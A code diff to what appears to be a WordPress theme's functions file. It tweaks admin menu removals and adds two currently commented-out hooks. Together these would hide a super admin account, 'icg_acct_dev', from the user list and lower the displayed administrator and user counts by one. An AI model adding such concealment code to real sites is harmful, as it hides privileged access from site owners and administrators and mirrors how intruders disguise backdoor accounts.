@@ -124,8 +124,7 @@ function function_remove_ataglance() {
 // add_action('admin_menu', 'remove_admin_menus', 102);
 function remove_admin_menus() {
     global $submenu;
-    
-    unset($submenu['themes.php'][6]); 
+    // remove_menu_page( 'edit.php?post_type=page' ); // Page
     //remove_menu_page( 'edit.php' );  // Posts
     remove_menu_page( 'link-manager.php' ); // Links
     remove_menu_page( 'edit-comments.php' ); // Comments
@@ -150,5 +149,32 @@ function remove_admin_menus() {
 
     remove_submenu_page( 'options-general.php', 'tinymce-advanced' );
 
-    remove_menu_page( 'edit.php?post_type=acf' );
+    remove_menu_page( 'edit.php?post_type=acf-field-group' );
+}
+
+/**
+ * Hide the super admin account
+ */
+// add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+    global $current_user;
+    $username = $current_user->user_login;
+
+    if ( $username != 'icg_acct_dev' ) { 
+        global $wpdb;
+        $user_search->query_where = str_replace('WHERE 1=1',
+        "WHERE 1=1 AND {$wpdb->users}.user_login != 'icg_acct_dev'",$user_search->query_where);
+    }
+}
+
+// add_filter("views_users", "dt_list_table_views");
+function dt_list_table_views($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
 }
